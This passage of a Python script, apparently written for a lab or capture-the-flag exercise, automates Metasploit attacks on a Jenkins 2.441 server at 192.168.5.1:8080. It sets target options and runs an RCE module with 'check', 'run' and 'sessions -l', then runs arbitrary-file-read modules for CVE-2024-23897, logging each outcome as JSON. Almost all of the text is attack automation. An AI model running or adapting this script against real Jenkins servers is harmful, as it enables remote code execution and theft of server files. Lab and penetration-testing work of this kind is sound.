rce_info = run_console("rce_option_inspection", "use " + RCE_MODULE + "; show options; exit -y")
rce_names = option_names(stdout_of(rce_info))
rce_sets, _ = option_commands(rce_names)
if "RHOSTS" not in rce_names and "RHOST" not in rce_names:
    print(json.dumps({"stage": "rce_candidate", "module": RCE_MODULE, "outcome": "inconclusive_configuration", "detail": "Displayed options did not include RHOSTS or RHOST; no test was launched.", "observed_options": sorted(rce_names)}))
else:
    cmds = ["use " + RCE_MODULE] + rce_sets + ["check", "run", "sessions -l", "exit -y"]
    run_console("rce_candidate_test", "; ".join(cmds))

if not file_candidates:
    print(json.dumps({"stage": "file_read_candidate", "outcome": "inconclusive_candidate_identity", "detail": "The observed Metasploit search output did not identify a Jenkins file-read/arbitrary-file-read/CVE-2024-23897 module. No module identifier was guessed.", "search_rows": [row[2] for row in rows]}))
else:
    for module in file_candidates:
        inspection = run_console("file_read_option_inspection", "use " + module + "; show options; exit -y")
        names = option_names(stdout_of(inspection))
        sets, path_option = option_commands(names, is_file_read=True)
        if path_option is None:
            print(json.dumps({"stage": "file_read_candidate", "module": module, "outcome": "inconclusive_configuration", "detail": "No recognized file-path option was present in the displayed options; candidate was not run.", "observed_options": sorted(names)}))
        elif "RHOSTS" not in names and "RHOST" not in names:
            print(json.dumps({"stage": "file_read_candidate", "module": module, "outcome": "inconclusive_configuration", "detail": "Displayed options did not include RHOSTS or RHOST; candidate was not run.", "observed_options": sorted(names), "file_path_option": path_option}))
        else:
            cmds = ["use " + module] + sets + ["run", "exit -y"]
            run_console("file_read_candidate_test", "; ".join(cmds))

print(json.dumps({"stage": "assessment_note", "target": TARGET, "observed_endpoint": "http://192.168.5.1:8080/", "jenkins_version": "2.441", "interpretation": "Only actual Metasploit output establishes a candidate outcome. A session list is required for RCE session evidence; file contents alone are not a session. A flag is reportable only if actually present in returned content."}))
